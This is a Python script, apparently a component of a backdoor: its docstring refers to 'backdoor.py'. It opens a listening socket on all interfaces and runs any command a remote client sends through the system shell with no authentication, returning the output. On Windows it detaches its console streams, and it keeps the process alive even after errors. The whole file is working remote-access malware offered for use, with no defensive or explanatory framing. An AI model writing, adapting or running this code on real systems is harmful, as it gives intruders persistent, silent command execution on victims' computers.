#!/usr/bin/env python3
"""
Standalone permanent proxy server
This script runs independently and stays alive even when backdoor.py stops
"""

import socket
import threading
import time
import subprocess
import sys
import os
from datetime import datetime

class PermanentProxy:
    """Permanent proxy that runs as standalone process"""
    
    def __init__(self, port):
        self.port = port
        self.is_running = False
        self.socket = None
        self.connections = {}
        self.connection_count = 0
        self.start_time = datetime.now()
        
    def handle_client_connection(self, client_socket, client_address):
        """Handle client connection directly - execute commands locally"""
        connection_id = f"conn_{self.connection_count}"
        self.connection_count += 1
        
        try:
            # Store connection info
            self.connections[connection_id] = {
                'client_addr': client_address,
                'start_time': datetime.now(),
                'commands_executed': 0
            }
            
            # Handle client commands directly
            while True:
                try:
                    # Receive command from client
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    command = data.decode().strip()
                    
                    # Remove JSON quotes if present
                    if command.startswith('"') and command.endswith('"'):
                        command = command[1:-1]
                    
                    # Execute command directly on Windows
                    if command.lower() in ['quit', 'exit']:
                        response = "Goodbye!"
                        client_socket.send(response.encode())
                        break
                    else:
                        # Execute the command
                        try:
                            result = subprocess.run(
                                command,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                            
                            # Get output
                            output = result.stdout + result.stderr
                            
                            if output.strip():
                                response = output.strip()
                            else:
                                response = "Command executed successfully (no output)"
                                
                            # Update connection stats
                            self.connections[connection_id]['commands_executed'] += 1
                            
                        except subprocess.TimeoutExpired:
                            response = "Command timed out after 30 seconds"
                        except Exception as e:
                            response = f"Command execution error: {str(e)}"
                    
                    # Send response back to client
                    client_socket.send(response.encode())
                    
                except Exception as e:
                    break
            
        except Exception as e:
            pass
        finally:
            # Clean up client socket
            try:
                client_socket.close()
            except:
                pass
            if connection_id in self.connections:
                del self.connections[connection_id]
    
    def run_server(self):
        """Main server loop"""
        try:
            # Create socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.listen(5)
            
            self.is_running = True
            
            while self.is_running:
                try:
                    # Accept connections with timeout
                    self.socket.settimeout(1.0)
                    client_socket, client_address = self.socket.accept()
                    
                    # Handle connection in separate thread
                    connection_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, client_address),
                        daemon=False  # Non-daemon so process stays alive
                    )
                    connection_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        time.sleep(1)
                        
        except Exception as e:
            pass
        finally:
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass

def main():
    """Main function - run permanent proxy"""
    if len(sys.argv) != 2:
        sys.exit(1)
    
    try:
        port = int(sys.argv[1])
    except ValueError:
        sys.exit(1)
    
    # Detach from parent process completely (Windows specific)
    if os.name == 'nt':  # Windows
        try:
            # Close stdin, stdout, stderr to fully detach
            sys.stdin.close()
            sys.stdout.close() 
            sys.stderr.close()
            
            # Reopen as devnull to prevent errors
            sys.stdin = open(os.devnull, 'r')
            sys.stdout = open(os.devnull, 'w')
            sys.stderr = open(os.devnull, 'w')
        except:
            pass
    
    # Create and run permanent proxy
    proxy = PermanentProxy(port)
    
    try:
        # Run the server (blocks indefinitely)
        proxy.run_server()
        
        # Keep process alive even if server stops
        while True:
            time.sleep(60)  # Sleep to keep process alive
            
    except KeyboardInterrupt:
        proxy.is_running = False
    except Exception as e:
        # Keep trying even on errors
        while True:
            time.sleep(60)

if __name__ == "__main__":
    main()